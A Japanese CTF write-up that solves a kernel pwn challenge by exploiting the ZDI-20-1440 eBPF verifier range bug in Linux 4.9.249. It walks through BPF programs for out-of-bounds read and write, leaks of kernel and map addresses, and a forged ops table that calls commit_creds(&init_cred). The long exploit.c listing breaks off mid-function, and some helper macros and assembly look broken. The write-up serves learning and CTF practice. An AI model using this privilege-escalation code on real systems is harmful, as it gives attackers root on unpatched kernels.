keywords
eBPF, verifier bug, kernel exploit, commit_creds(&init_cred), without bpf_map.btf

# イントロ
いつぞや開催された**AIS3 EOF CTF 2020 Finals** (全く知らないCTF...)。そのpwn問題である**Day One**を解いていく。先に言うと本問題は去年公開されたLinuxKernelのeBPF verifierのバグを題材にした問題であり、元ネタは[ZDI](https://www.thezdi.com/blog/2021/1/18/zdi-20-1440-an-incorrect-calculation-bug-in-the-linux-kernel-ebpf-verifier)から公開されている。オリジナルのauthorは[TWの人](https://twitter.com/ga_ryo_)で、問題のauthorは[HexRabbit](https://twitter.com/h3xr4bb1t)さん。

# static
## basic
```basic.sh
/ $ cat /proc/version
Linux version 4.9.249 (root@kernel-builder) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04) ) #8 SMP Mon1
/ $ cat /proc/sys/net/core/bpf_jit_enable
1

qemu-system-x86_64 \
  -kernel bzImage \
  -initrd rootfs.cpio.gz \
  -append "console=ttyS0 oops=panic panic=-1 kaslr quiet" \
  -monitor /dev/null \
  -nographic \
  -cpu qemu64,+smep,+smap \
  -m 256M \
  -virtfs local,path=$SHARED_DIR,mount_tag=shared,security_model=passthrough,readonly
```

デバッグ用なのか、こちらで指定するディレクトリをvirtfsでマウントしてくれる(今回は関係ない)。
SMEP有効・SMAP有効・KAISER有効・oops->panic。

## patch
```patch.diff
diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index 335c002..08dca71 100644
--- a/kernel/bpf/verifier.c
+++ b/kernel/bpf/verifier.c
@@ -352,7 +352,7 @@ static void print_bpf_insn(const struct bpf_verifier_env *env,
 			u64 imm = ((u64)(insn + 1)->imm << 32) | (u32)insn->imm;
 			bool map_ptr = insn->src_reg == BPF_PSEUDO_MAP_FD;
 
-			if (map_ptr && !env->allow_ptr_leaks)
+			if (map_ptr && !capable(CAP_SYS_ADMIN))
 				imm = 0;
 
 			verbose("(%02x) r%d = 0x%llx\n", insn->code,
@@ -3627,7 +3627,7 @@ int bpf_check(struct bpf_prog **prog, union bpf_attr *attr)
 	if (ret < 0)
 		goto skip_full_check;
 
-	env->allow_ptr_leaks = capable(CAP_SYS_ADMIN);
+	env->allow_ptr_leaks = true;
 
 	ret = do_check(env);
 
@@ -3731,7 +3731,7 @@ int bpf_analyzer(struct bpf_prog *prog, const struct bpf_ext_analyzer_ops *ops,
 	if (ret < 0)
 		goto skip_full_check;
 
-	env->allow_ptr_leaks = capable(CAP_SYS_ADMIN);
+	env->allow_ptr_leaks = true;
 
 	ret = do_check(env);
```
うーむ、なんというか[ZDI-20-1440](https://www.thezdi.com/blog/2021/1/18/zdi-20-1440-an-incorrect-calculation-bug-in-the-linux-kernel-ebpf-verifier)で`CAP_SYS_ADMIN`がないとできないこと()を無理やり修正してる。若干予定調和感が否めないな。
 
# vuln
## ZDI-20-1440
verifierのregister rangeの更新ミス。利用しているkernelが上記からも分かるとおり、**4.9.249**であり、これは影響を受けている数少ないバージョンの一つである。以下のように`adjust_reg_min_max_vals()`において`BPF_RSH`演算の際に`dst_reg`の値の更新をミスっている。まんまZDI-20-1440のままである。
```kernel/bpf.verifier.c
	case BPF_RSH:
 	/* RSH by a negative number is undefined, and the BPF_RSH is an
 	 * unsigned shift, so make the appropriate casts.
 	 */
 	if (min_val < 0 || dst_reg->min_value < 0)
 		dst_reg->min_value = BPF_REGISTER_MIN_RANGE;
 	else
 		dst_reg->min_value =
 			(u64)(dst_reg->min_value) >> min_val;
 	if (dst_reg->max_value != BPF_REGISTER_MAX_RANGE)
 		dst_reg->max_value >>= max_val;
 	break;
```

## patchの意味
そもそもZDI-20-1440がLPEまで繋がらなかったのは、**mapを指すポインタに対する加法を行うのにCAP_SYS_ADMIN**が必要だったからである。`BPF_ALU64(BPF_ADD)`を行う際には、`do_check()`において以下のように`check_alu_op()`が呼び出され、それが加算であり、且つdstレジスタの中身が`PTR_TO_MAP_VALUE`又は`PTR_TO_MAP_VALUE_ADJ`でない場合には、レジスタを完全に**unknown**でマークしてしまう(`[S64_MIN,S64_MAX]`にされる)。
```do_check()@kernel/bpf/verifier.c
		if (class == BPF_ALU || class == BPF_ALU64) {
			err = check_alu_op(env, insn);
			if (err)
				return err;

		} else if (class == BPF_LDX) {
```
```check_alu_op()@kernel/bpf/verifier.c
		if (env->allow_ptr_leaks &&
		    BPF_CLASS(insn->code) == BPF_ALU64 && opcode == BPF_ADD &&
		    (dst_reg->type == PTR_TO_MAP_VALUE ||
		     dst_reg->type == PTR_TO_MAP_VALUE_ADJ))
			dst_reg->type = PTR_TO_MAP_VALUE_ADJ;
		else
			mark_reg_unknown_value(regs, insn->dst_reg);
	}
```
それではこの`env->allow_ptr_leaks`がいつセットされるかと言うと、`bpf_check()`で`do_check()`を呼び出す直前に`CAP_SYS_ADMIN`を持っているかどうかで判断している。
```bpf_check()@kernel/bpf/verifier.c
	env->allow_ptr_leaks = capable(CAP_SYS_ADMIN);

	ret = do_check(env);
```
即ち、`CAP_SYS_ADMIN`がないと`allow_ptr_leaks`が`true`にならず、したがってmapに対する加算が全てunknownでマークされてしまうため、[mapに対するOOBの攻撃](https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification)ができなくなってしまうというわけである。
今回のパッチは、2つ目と3つ目でこの制限を取り払い`allow_ptr_leaks`を常に`true`にしている(1つ目はlog表示のことなので関係ない)。

## 最新のkernelでは
最初にZDIの該当レポートを読んだ時、mapポインタに対する加算が`CAP_SYS_ADMIN`がないとダメだということにちょっと驚いた。というのも、[TWCTFのeepbf](https://smallkirby.hatenablog.com/entry/2021/01/31/210158)をやったときには、この権限がない状態でmapを操作してAAWに持っていったからだ。というわけで新しめのkernelを見てみると、`check_alu_op()`において該当の処理が消えていた。すなわち、mapポインタに対する加法はそれがmapの正答なメモリレンジ内にある限りnon-adminに対しても許容されるようになっていた(勿論レンジのチェックは`check_map_access()`において行われる)。

## というか、pointer leakが任意に可能じゃん...
というか、`allow_ptr_leaks`が`true`になっているため、任意にポインタをリークすることができる。例えば、以下のようなeBPFプログラムで(rootでなくても)簡単にmapのアドレスがleakできる。
```stack_leak.c
    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &cmap[0]
    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_8)
```
```result.sh
/ $ ./mnt/exploit
[80] 0xffff88000e300a90
[88] 0xffff88000e300a90
[96] 0xffff88000e300a90
[104] 0xffff88000e300a90
[112] 0xffff88000e300a90
[120] 0xffff88000e300a90
[128] 0xffff88000e300a90
[136] 0xffff88000e300a90
```
うーん、お題のために制限をゆるくしすぎてる気がするなぁ。。。


# leak kernbase
## 0に見える1をつくる
こっからは作業ゲーです。
まずは以下のBPFコードでverifierからは0に見えるような1をつくる。
```make_1_looks_0.c
    /* get cmap[0] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),       // r6 = cmap[0] (==0)
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                // r9 = &cmap[0]
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &cmap[0]
    /* get cmap[1] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),                // qword[r2] = 1
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 1)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),       // r7 = cmap[1] (==1)
    /* fix r6/r7 range */
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 0, 2),              // ensure R6>=0
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 2, 1),              // ensure 0<=R6<=1
    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 0, 2),              // ensure R7>=0
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 2, 1),              // ensure 0<=R7<=1
    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    // exploit r6 range 
    BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_7),       // r6 >>= r7 (r6 regarded as 0, actually 1)
    BPF_ALU64_IMM(BPF_NEG, BPF_REG_6, 0),               // r6 *= -1
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, N),               // r6 *= N
```
但し、`control_map`はサイズ8、要素数10のARRAYである。`[0]`には常に1を入れ、`[1]`には常に0を入れておく。前半はただ`control_map`から0と1を取得しているだけである。`fix r6/r7 range`と書いてあるところでバグを利用して0に見える1を作っている。ジャンプ命令が多いのは、R6/R7の上限と下限をそれぞれ1,0にするためである。最後に、`BPF_NEG`にしているのは、leakの段階ではleakしたいものが負の方向にあるからである。最後に**定数のN**をかけてOOB(R)を達成している。尚、このNをmapから取ってきたような値にすると、MULの時にverifierがdstをunknownにマークしてしまうため、プログラムをロードする度に定数値をNに入れて毎回動的にロードしている(前回eBPF問題を解いた時はNをmapから取得した値にして何度もverifierに怒られた...)。
実際にlog表示を見てみると、以下のようにR6は0と認識されていることが分かる。
```verifier-log.txt
from 28 to 31: R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=inv,min_value=0,max_value=1 R7=inv,min_value=0 R8=map_valup
31: (75) if r7 s>= 0x2 goto pc+1
 R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=inv,min_value=0,max_value=1 R7=inv,min_value=0,max_value=1 R8=map_value(p
32: (05) goto pc+2
35: (7f) r6 >>= r7
36: (87) r6 neg 0
37: (27) r6 *= 136
38: (0f) r9 += r6
39: (79) r3 = *(u64 *)(r9 +0)
 R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=inv,min_value=0,max_value=0 R7=inv,min_value=0,max_value=1 R8=map_value(p
40: (7b) *(u64 *)(r8 +0) = r3
```

## leak from bpf_map.ops
今回はmap typeとしてARRAYを選択しているため、`struct bpf_array`と`struct bpf_map`が使われる。構造体はそれぞれ以下のとおり。
![](https://i.imgur.com/tpYB9Nh.png)
![](https://i.imgur.com/DJM7Pwy.png)

この内、`bpf_map.ops`は、`kernel/bpf/arraymap.c`で定義されるように`array_ops`が入っている。これをleakすることでkernbaseをleakしたことになる。
![](https://i.imgur.com/j5FR3Sg.png)

厳密にmapから`ops`までのオフセットを計算するのは面倒くさいため適当に検討をつけてみてみると、以下のようになる。
```leak-bpf_map-ops.c
  int N=0x80;
  for(int ix=N/8; ix!=N/8+8; ++ix){
    printf("[%d] 0x%lx\n", ix*0x8, read_rel(ix*0x8));
  }
 
 / # ./mnt/exploit
[128] 0xa00000008
[136] 0x400000002
[144] 0xffffffff81a12100 <-- こいつ
[152] 0x0
[160] 0x0
[168] 0x0
[176] 0x0
[184] 0x0
```
 
# AAR via bpf_map_get_info_by_id() [FAIL]
以前解いた[eebpf](https://smallkirby.hatenablog.com/entry/2021/01/31/210158)では、`bpf_map.btf`を書き換えて`bpf_map_get_info_by_id()`を呼び出すことでAARを実現できた。だが上の`bpf_map`構造体を見て分かるとおり、**bpf_map.bfpというメンバは存在していない**。kernelが古いからね...。というわけで、この方法によるAARは諦める。
 
# forge ops and commit_creds(&init_cred) directly
本問では、上述したようにmap自体のアドレスを容易にleakすることができる。また、`bpf_map`の全てを自由に書き換えることができる。よって、mapの中にfake function tableを用意しておいて、`bpf_map.ops`をこれに向ければ任意の関数を実行させることができる。取り敢えず、以下のようにするとRIPが取れる。
```rip-poc.c
  const ulong fakeops_addr = controlmap_addr + 0x10;
  int N = 0x90;
  struct bpf_insn reader_insns[] = {
    /* get cmap[0] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),       // r6 = cmap[0] (==0)
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                // r9 = &cmap[0]
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &cmap[0]
    /* get cmap[1] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),                // qword[r2] = 1
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 1)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),       // r7 = cmap[1] (==1)
    /* fix r6/r7 range */
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 0, 2),              // ensure R6>=0
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 2, 1),              // ensure 0<=R6<=1
    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 0, 2),              // ensure R7>=0
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 2, 1),              // ensure 0<=R7<=1
    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    // exploit r6 range 
    BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_7),       // r6 >>= r7 (r6 regarded as 0, actually 1)
    BPF_ALU64_IMM(BPF_NEG, BPF_REG_6, 0),               // r6 *= -1
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),                // r7 = r6
    // overwrite ops into forged ops
    BPF_MOV64_IMM(BPF_REG_1, (fakeops_addr>>32) & 0xFFFFFFFFUL),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, fakeops_addr & 0xFFFFFFFFUL),
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, N),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_8, BPF_REG_6),       // r8 += r6
    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, 0),
    
    // Go Home
    BPF_MOV64_IMM(BPF_REG_0, 0),                        // r0 = 0
    BPF_EXIT_INSN()
  };

  int evilwriter= create_filtered_socket_fd(reader_insns, ARRSIZE(reader_insns));
  if(evilwriter < 0){
    errExit("reader not initialized");
  }

  // setup fake table
  for(int ix=0; ix!=7; ++ix){
    array_update(control_map, ix+2, 0xcafebabedeadbeef);
  }

  array_update(control_map, 0, 1);
  array_update(control_map, 1, 0);
  trigger_proc(evilwriter);
  const ulong tmp = get_ulong(control_map, 0);
```
![](https://i.imgur.com/UlkeuJW.png)
 
ここでOopsが起きた原因は、用意したfaketableの+0x20にアクセスし、不正なアドレス0xcafebabedeadbeefにアクセスしようとしたからである。ジャンプテーブルの+0x20というのは`map_lookup_elem()`である。
![](https://i.imgur.com/zKB4k7t.png)


さて、このようにRIPを取ることはできるが、問題はもとの関数テーブルの全ての関数の第一引数が`struct bpf_map *map`であるということである。つまり、第一引数は任意に操作することができない。よって、関数の中でいい感じに第二引数以降を利用していい感じの処理をしてくれる関数があると嬉しい。その観点で`kernel/bpf/arraymap.c`を探すと、`fd_array_map_delete_elem()`が見つかる。これは、`perf_event_array_ops`とか`prog_array_ops`とかのメンバである。(尚、`map_array_ops`の該当メンバである`array_map_delete_elem()`は`-EINVAL`を返すだけのニート関数である。お前なんて関数やめてインラインになってしまえばいい)。
```kernel/bpf/arraymap.c
static int fd_array_map_delete_elem(struct bpf_map *map, void *key)
{
	struct bpf_array *array = container_of(map, struct bpf_array, map);
	void *old_ptr;
	u32 index = *(u32 *)key;

	if (index >= array->map.max_entries)
		return -E2BIG;

	old_ptr = xchg(array->ptrs + index, NULL);
	if (old_ptr) {
		map->ops->map_fd_put_ptr(old_ptr);
		return 0;
	} else {
		return -ENOENT;
	}
}
```
`xchg()`は、第一引数の指すポインタの指す先に第二引数の値を入れて、古い値を返す関数である。そしてその先で`map->ops->map_fd_put_ptr(old_ptr)`を呼んでくれる。つまり、`array->ptrs`の指す先に`&init_cred`を入れておいて、`map->ops->map_fd_put_ptr`を`commit_creds`に書き換えれば`commit_creds(&init_cred)`を直接呼んだことになる。やったね！

一つ注意として、`execve()`でシェルを呼んでしまうと、socketが解放されてその際にmapの解放が起きてしまう。テーブルを書き換えているためその時にOopsが起きて死んでしまう。よってシェルは`system("/bin/sh")`で呼ぶ。


# exploit
```exploit.c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>

// eBPF-utils
#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_REG_CTX     BPF_REG_6
#define BPF_REG_FP      BPF_REG_10

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_MOV64_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU32_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EMIT_CALL(FUNC)                     \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_CALL,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = (FUNC) })
#define BPF_JMP_REG(OP, DST, SRC, OFF)				  \
  ((struct bpf_insn) {					                \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_X,      \
    .dst_reg = DST,					                    \
    .src_reg = SRC,					                    \
    .off   = OFF,					                      \
    .imm   = 0 })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_LD_ABS(SIZE, IMM)                   \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })

int bpf_(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int array_create(int value_size, int num_entries) {
  union bpf_attr create_map_attrs = {
      .map_type = BPF_MAP_TYPE_ARRAY,
      .key_size = 4,
      .value_size = value_size,
      .max_entries = num_entries
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");
  return mapfd;
}

int array_update(int mapfd, uint32_t key, uint64_t value)
{
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key = (uint64_t)&key,
    .value = (uint64_t)&value,
    .flags = BPF_ANY,
  };
  return bpf_(BPF_MAP_UPDATE_ELEM, &attr);
}

int array_update_big(int mapfd, uint32_t key, char* value)
{
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key = (uint64_t)&key,
    .value = value,
    .flags = BPF_ANY,
  };
  return bpf_(BPF_MAP_UPDATE_ELEM, &attr);
}

unsigned long get_ulong(int map_fd, uint64_t idx) {
  uint64_t value;
  union bpf_attr lookup_map_attrs = {
    .map_fd = map_fd,
    .key = (uint64_t)&idx,
    .value = (uint64_t)&value
  };
  if (bpf_(BPF_MAP_LOOKUP_ELEM, &lookup_map_attrs))
    err(1, "MAP_LOOKUP_ELEM");
  return value;
}

int prog_load(struct bpf_insn *insns, size_t insns_count) {
  char verifier_log[100000];
  union bpf_attr create_prog_attrs = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = insns_count,
    .insns = (uint64_t)insns,
    .license = (uint64_t)"GPL v2",
    .log_level = 2,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };
  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
  int errno_ = errno;
  //printf("==========================\n%s==========================\n",verifier_log);
  errno = errno_;
  if (progfd == -1)
    err(1, "prog load");
  return progfd;
}

int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count) {
  int progfd = prog_load(insns, insns_count);

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    err(1, "socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    err(1, "setsockopt");
  return socks[1];
}

void trigger_proc(int sockfd) {
  if (write(sockfd, "X", 1) != 1)
    err(1, "write to proc socket failed");
}
// (END eBPF-utils)


// commands
#define DEV_PATH ""   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
int control_map;
int reader = -1;
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
#define REP(N) for(int moratorium=0; moratorium!+N; ++N)
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
  ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
  ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
  ulong ax; ulong cx; ulong dx; ulong si; ulong di;
  ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  int ruid, euid, suid;
  getresuid(&ruid, &euid, &suid);
  if(euid != 0)
    errExit("[ERROR] somehow, couldn't get root...");
  system("/bin/sh");
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

ulong read_rel(int N)
{
  struct bpf_insn reader_insns[] = {
    /* get cmap[0] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
